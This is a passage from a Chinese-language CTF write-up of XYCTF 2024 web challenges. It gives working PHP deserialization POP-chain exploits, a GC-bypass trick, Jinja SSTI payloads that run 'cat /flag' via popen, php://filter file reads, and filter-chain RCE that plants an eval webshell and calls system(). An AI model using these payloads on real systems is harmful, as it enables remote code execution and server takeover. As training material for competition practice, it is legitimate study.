}\n}\n\n\nif(isset($_GET['xy'])) {\n    $a = unserialize($_GET['xy']);\n    throw new Exception(\"noooooob!!!\");\n}\n```\n\n这里的话链子还是很简单的\n\n```\nCCC::__destruct()->AAA::__toString()->BBB::__get()\n```\n\nexp\n\n```php\n<?php\nclass AAA\n{\n    public $s;\n    public $a;\n}\n\nclass BBB\n{\n    public $c;\n    public $d;\n}\n\nclass CCC\n{\n    public $c;\n}\n//CCC::__destruct()->AAA::__toString()->BBB::__get()\n$c = new CCC();\n$c-> c = new AAA();\n$c-> c -> s = new BBB();\n```\n\n重点在于get方法中的\n\n```php\npublic function __get($name)\n    {\n        echo \"you get 2 B <br>\";\n        $a=$_POST['a'];\n        $b=$_POST;\n        $c=$this->c;\n        $d=$this->d;\n        if (isset($b['a'])) {\n            unset($b['a']);\n        }\n        call_user_func($a,$b)($c)($d);\n    }\n```\n\n这里的话会检测是否有a参数并删除a参数，重点在于\n\n```php\ncall_user_func($a, $b)($c)($d);\n```\n\n这里的话是一个动态函数调用链，先是调用函数 `$a`，并将 `$b` 作为参数传递，调用后还会对结果链式调用两次，这个动态调用还是第一次见，看wp后发现也是函数嵌套调用\n\n用`implode`函数打，可以将数组连接成字符串，说白了就是占个位置，最终还是落实到最后的$c和$d去进行代码执行\n\n先试一下\n\n```php\n<?php\n$a = \"implode\";\n$b = [\"impl\",\"ode\"];\necho implode($b);\n//implode\n```\n\n然后我们构造一下payload\n\n```php\n<?php\n$a = \"implode\";\n$b = [\"impl\",\"ode\"];\n$c = array(\"sys\", \"tem\");\n$d = \"whoami\";\ncall_user_func($a,$b)($c)($d);\n//wanth3f1ag\\23232\n```\n\n成功执行了，然后我们试着写exp\n\n```php\n<?php\nclass AAA\n{\n    public $s;\n    public $a;\n}\n\nclass BBB\n{\n    public $c = array(\"sys\", \"tem\");\n    public $d = \"ls\";\n}\n\nclass CCC\n{\n    public $c;\n}\n//CCC::__destruct()->AAA::__toString()->BBB::__get()\n$c = new CCC();\n$c-> c = new AAA();\n$c-> c -> s = new BBB();\necho serialize($c);\n//O:3:\"CCC\":1:{s:1:\"c\";O:3:\"AAA\":2:{s:1:\"s\";O:3:\"BBB\":2:{s:1:\"c\";a:2:{i:0;s:3:\"sys\";i:1;s:3:\"tem\";}s:1:\"d\";s:2:\"ls\";}s:1:\"a\";N;}}\n```\n\n这里还需要注意一行代码\n\n```php\nthrow new Exception(\"noooooob!!!\");\n```\n\nNewStar2023年的一道题也有，就是GC回收绕过\n\n`throw new Exception(\"noooooob!!!\");` 是 PHP 中用于抛出异常的语句。它的作用是创建一个异常对象并将其抛出，通常用于在程序遇到错误或意外情况时中断正常流程，并将错误信息传递给调用者。\n\n首先我们需要知道，在php中，当对象被销毁时会自动调用__destruct()方法，但如果程序报错或者抛出异常，就不会触发该魔术方法。\n\n```php\n<?php\nclass test{\n    public $test = \"yes\";\n    public function __destruct() {\n        echo $this->test;\n    }\n}\n$a = new test();\nthrow new Exception(\"noooooob!!!\");\n```\n\n测试并没有输出yes，说明没触发该方法，这是因为throw函数自动回收了销毁的对象，导致destruct检测不到有东西销毁，从而导致无法触发魔术方法\n\n所以我们可以通过提前触发垃圾回收机制来抛出异常，从而绕过GC回收，唤醒__destruct()魔术方法。\n\n触发垃圾回收机制的方法有\n\n- 数组对象为NULL时，可以触发。\n- 对象被unset()处理时，可以触发。\n\n所以我们这里可以用第一个方法，去构造数组对象并让数组对象为NULL\n\n所以最后的exp\n\n直接用array($c, null)得到一个数组,然后改成非法数组\n\n本地测试debug一下\n\n![image-20250518215956707](../image/achieve/202411/XYCTF2024/image-20250518215956707.png)\n\n![image-20250518220028879](../image/achieve/202411/XYCTF2024/image-20250518220028879.png)\n\n发现可以绕过，直接打就行\n\nexp\n\n```php\n<?php\nclass AAA\n{\n    public $s;\n    public $a;\n}\n\nclass BBB\n{\n    public $c = array(\"sys\", \"tem\");\n    public $d = \"cat /flag\";\n}\n\nclass CCC\n{\n    public $c;\n}\n//CCC::__destruct()->AAA::__toString()->BBB::__get()\n$c = new CCC();\n$c-> c = new AAA();\n$c-> c -> s = new BBB();\n$d = serialize(array($c,null));\n$e = str_replace(\"i:1;N;\",\"i:0;N;\",$d);\necho urlencode($e);\n```\n\n```\nGET:\nxy=a%3A2%3A%7Bi%3A0%3BO%3A3%3A%22CCC%22%3A1%3A%7Bs%3A1%3A%22c%22%3BO%3A3%3A%22AAA%22%3A2%3A%7Bs%3A1%3A%22s%22%3BO%3A3%3A%22BBB%22%3A2%3A%7Bs%3A1%3A%22c%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22sys%22%3Bi%3A1%3Bs%3A3%3A%22tem%22%3B%7Ds%3A1%3A%22d%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A1%3A%22a%22%3BN%3B%7D%7Di%3A0%3BN%3B%7D\nPOST:\na=implode&1=impl&2=ode\n```\n\n## 我是一个复读机\n\n### #SSTI\n\n有个弱口令的字典，下下来吧\n\n这个字典爆的有点久，然后爆破密码为asdqwe\n\n登录进去就是一个界面\n\n![image-20250518221820810](../image/achieve/202411/XYCTF2024/image-20250518221820810.png)\n\n过滤了flag,也过滤了`{}`\n\n测试之后发现存在xss，传入中文后出现`我只能看懂你说的英文(＞﹏＜){}`后面有括号，猜测可以通过报错把ssti的结果爆出来\n\n```\n一8*8一\n```\n\n出现回显64，可以确认为打jinja的ssti\n\n测试之后发现过滤了`\" , ' [ ] flag _ os `，直接打request外带吧这样快一些\n\n```\n?sentence=一(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()一&a=__globals__&b=os&c=cat%20/flag\n```\n\n## ezSerialize\n\n### level1\n\n### #指针绕过\n\n```php\n<?php\ninclude 'flag.php';\nhighlight_file(__FILE__);\nerror_reporting(0);\n\nclass Flag {\n    public $token;\n    public $password;\n\n    public function __construct($a, $b)\n    {\n        $this->token = $a;\n        $this->password = $b;\n    }\n\n    public function login()\n    {\n        return $this->token === $this->password;\n    }\n}\n\nif (isset($_GET['pop'])) {\n    $pop = unserialize($_GET['pop']);\n    $pop->token=md5(mt_rand());\n    if($pop->login()) {\n        echo $flag;\n    }\n}\n```\n\n这里的话需要满足login中的条件，所以token需要等于password，但是token是一个随机数的md5加密\n\n但是这里没有随机数种子，所以是伪随机数的可能性不大\n\n其实这道题是ctfshow中的web265，用指针去打就行\n\n详细参考一下我之前web265的wphttps://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-ctfshow/\n\nexp\n\n```php\n<?php\nclass Flag {\n    public $token;\n    public $password;\n\n    public function __construct()\n    {\n        $this->password = &$this -> token;\n    }\n}\n$a = new Flag();\necho urlencode(serialize($a));\n```\n\n传入后拿到fpclosefpclosefpcloseffflllaaaggg.php文件\n\n### level2\n\n### #常规php\n\n```php\n<?php\nhighlight_file(__FILE__);\nclass A {\n    public $mack;\n    public function __invoke()\n    {\n        $this->mack->nonExistentMethod();\n    }\n}\n\nclass B {\n    public $luo;\n    public function __get($key){\n        echo \"o.O<br>\";\n        $function = $this->luo;\n        return $function();\n    }\n}\n\nclass C {\n    public $wang1;\n\n    public function __call($wang1,$wang2)\n    {\n            include 'flag.php';\n            echo $flag2;\n    }\n}\n\n\nclass D {\n    public $lao;\n    public $chen;\n    public function __toString(){\n        echo \"O.o<br>\";\n        return is_null($this->lao->chen) ? \"\" : $this->lao->chen;\n    }\n}\n\nclass E {\n    public $name = \"xxxxx\";\n    public $num;\n\n    public function __unserialize($data)\n    {\n        echo \"<br>学到就是赚到!<br>\";\n        echo $data['num'];\n    }\n    public function __wakeup(){\n        if($this->name!='' || $this->num!=''){\n            echo \"旅行者别忘记旅行的意义!<br>\";\n        }\n    }\n}\n\nif (isset($_POST['pop'])) {\n    unserialize($_POST['pop']);\n}\n```\n\n链子也是很简单的\n\n```\nE::__wakeup()->D::__toString()->B::__get()->A::__invoke()->C::__call()\n```\n\nexp\n\n```php\n<?php\nclass A{\n    public $mack;\n}\nclass B {\n    public $luo;\n}\n\nclass C {\n    public $wang1;\n}\n\n\nclass D {\n    public $lao;\n    public $chen;\n}\n\nclass E {\n    public $name ;\n    public $num;\n}\n//E::__unserialize()->D::__toString()->B::__get()->A::__invoke()->C::__call()\n$a = new E();\n$a -> num = new D();\n$a -> name = '';\n$a -> num -> lao = new B();\n$a -> num -> lao -> luo = new A();\n$a -> num -> lao -> luo -> mack = new C();\necho urlencode(serialize($a));\n```\n\n然后拿到saber_master_saber_master.php，继续\n\n### level3\n\n```php\n<?php\n\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n// flag.php\nclass XYCTFNO1\n{\n    public $Liu;\n    public $T1ng;\n    private $upsw1ng;\n\n    public function __construct($Liu, $T1ng, $upsw1ng = Showmaker)\n    {\n        $this->Liu = $Liu;\n        $this->T1ng = $T1ng;\n        $this->upsw1ng = $upsw1ng;\n    }\n}\n\nclass XYCTFNO2\n{\n    public $crypto0;\n    public $adwa;\n\n    public function __construct($crypto0, $adwa)\n    {\n        $this->crypto0 = $crypto0;\n    }\n\n    public function XYCTF()\n    {\n        if ($this->adwa->crypto0 != 'dev1l' or $this->adwa->T1ng != 'yuroandCMD258') {\n            return False;\n        } else {\n            return True;\n        }\n    }\n}\n\nclass XYCTFNO3\n{\n    public $KickyMu;\n    public $fpclose;\n    public $N1ght = \"Crypto0\";\n\n    public function __construct($KickyMu, $fpclose)\n    {\n        $this->KickyMu = $KickyMu;\n        $this->fpclose = $fpclose;\n    }\n\n    public function XY()\n    {\n        if ($this->N1ght == 'oSthing') {\n            echo \"WOW, You web is really good!!!\\n\";\n            echo new $_POST['X']($_POST['Y']);\n        }\n    }\n\n    public function __wakeup()\n    {\n        if ($this->KickyMu->XYCTF()) {\n            $this->XY();\n        }\n    }\n}\n\n\nif (isset($_GET['CTF'])) {\n    unserialize($_GET['CTF']);\n}\n```\n\n这里的话需要在XYCTFNO1类中添加一个属性crypto0\n\n```php\n<?php\n// flag.php\nclass XYCTFNO1\n{\n    public $Liu;\n    public $T1ng;\n    private $upsw1ng;\n    public $crypto0=\"dev1l\";\n}\n\nclass XYCTFNO2\n{\n    public $crypto0;\n    public $adwa;\n}\n\nclass XYCTFNO3\n{\n    public $KickyMu;\n    public $fpclose;\n    public $N1ght = \"oSthing\";\n}\n$a = new XYCTFNO3();\n$a -> KickyMu = new XYCTFNO2();\n$a -> KickyMu -> adwa = new XYCTFNO1();\n$a -> KickyMu -> adwa ->T1ng = \"yuroandCMD258\";\n//unserialize(serialize($a));\necho serialize($a);\n//O:8:\"XYCTFNO3\":3:{s:7:\"KickyMu\";O:8:\"XYCTFNO2\":2:{s:7:\"crypto0\";N;s:4:\"adwa\";O:8:\"XYCTFNO1\":4:{s:3:\"Liu\";N;s:4:\"T1ng\";s:13:\"yuroandCMD258\";s:17:\"%00XYCTFNO1%00upsw1ng\";N;s:7:\"crypto0\";s:5:\"dev1l\";}}s:7:\"fpclose\";N;s:5:\"N1ght\";s:7:\"oSthing\";}\n```\n\n记得在private属性的属性名加上%00\n\n然后有`new $_POST['X']($_POST['Y']);`，这里的话用原生类去读取文件就行\n\n### #原生类SplFileObject读取文件\n\n这里用php原生类SplFileObject读/flag\n\n![image-20250519094207459](../image/achieve/202411/XYCTF2024/image-20250519094207459.png)\n\nSplFileObject 类中的fgets和fread方法都可以读文件，尽管这些方法没有参数，但是filename文件名是在类中确定的，所以直接传文件名就行\n\n但是这里直接传flag.php不行，可能会解析，配合伪协议读就行\n\n因为这里会解析，所以当然也可以写马\n\n```\nGET:?CTF=O%3A8%3A%22XYCTFNO3%22%3A3%3A%7Bs%3A7%3A%22KickyMu%22%3BO%3A8%3A%22XYCTFNO2%22%3A2%3A%7Bs%3A7%3A%22crypto0%22%3BN%3Bs%3A4%3A%22adwa%22%3BO%3A8%3A%22XYCTFNO1%22%3A4%3A%7Bs%3A3%3A%22Liu%22%3BN%3Bs%3A4%3A%22T1ng%22%3Bs%3A13%3A%22yuroandCMD258%22%3Bs%3A17%3A%22%00XYCTFNO1%00upsw1ng%22%3BN%3Bs%3A7%3A%22crypto0%22%3Bs%3A5%3A%22dev1l%22%3B%7D%7Ds%3A7%3A%22fpclose%22%3BN%3Bs%3A5%3A%22N1ght%22%3Bs%3A7%3A%22oSthing%22%3B%7D\nPOST:\nX=SplFileObject&Y=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n![image-20250519094641413](../image/achieve/202411/XYCTF2024/image-20250519094641413.png)\n\n## ezLFI\n\n### #filter链RCE\n\n附件中有\n\n```\n<?php include_once($_REQUEST['file']);\n```\n\n文件包含\n\n```\n?file=/etc/passwd\n```\n\n成功实现任意文件读取，可以打filter链实现RCE\n\n```\nroot@VM-16-12-ubuntu:/opt/php_filter_chain_RCE/php_filter_chain_generator# python3 php_filter_chain_generator.py -h\nusage: php_filter_chain_generator.py [-h] [--chain CHAIN] [--rawbase64 RAWBASE64]\n\nPHP filter chain generator.\n\noptions:\n  -h, --help            show this help message and exit\n  --chain CHAIN         Content you want to generate. (you will maybe need to pad with spaces for\n                        your payload to work)\n  --rawbase64 RAWBASE64\n                        The base64 value you want to test, the chain will be printed as base64 by\n                        PHP, useful to debug.\n```\n\n用phpinfo试一下\n\n```\npython3 php_filter_chain_generator.py --chain '<?php @eval($_POST['cmd']);?>'\n```\n\n传入\n\n```php+HTML\n?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp\n```\n\n![image-20250519150052097](../image/achieve/202411/XYCTF2024/image-20250519150052097.png)\n\n成功RCE，那就试着写马\n\n```\nGET:\n?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp\n\nPOST:\ncmd=system('cat /flag');\n```\n\n但是发现读取flag没读出来，看到一个readflag，运行一下\n\n```\ncmd=system('/readflag');\n```\n\n然后就读出来了\n\n后来发现readflag是一个c文件，这个文件可以读取并输出flag的值，所以直接运行就完事了\n\n## 连连看到底是连连什么看\n\n点击about看到一个参数file，测一下/etc/passwd看看有没有任意文件读取，发现出来一个文件what's_this.php\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\n$p=$_GET['p'];\n\nif(preg_match(\"/http|=|php|file|:|\\/|\\?/i\", $p))\n{\n    die(\"waf!\");\n}\n\n$payload=\"php://filter/$p/resource=/etc/passwd\";\n\nif(file_get_contents($payload)===\"XYCTF\"){\n    echo file_get_contents('/flag');\n}\n\n```\n\n其实和刚刚的题目一样的，用脚本生成一下XYCTF\n\n但是发现这里的强比较，以为着我们必须让内容完全为XYCTF\n\n原先的payload\n\n```\n?p=convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp\n```\n\n![image-20250519151308336](../image/achieve/202411/XYCTF2024/image-20250519151308336.png)\n\n算了看不懂，看别人的wp吧\n\n```\n?p=convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.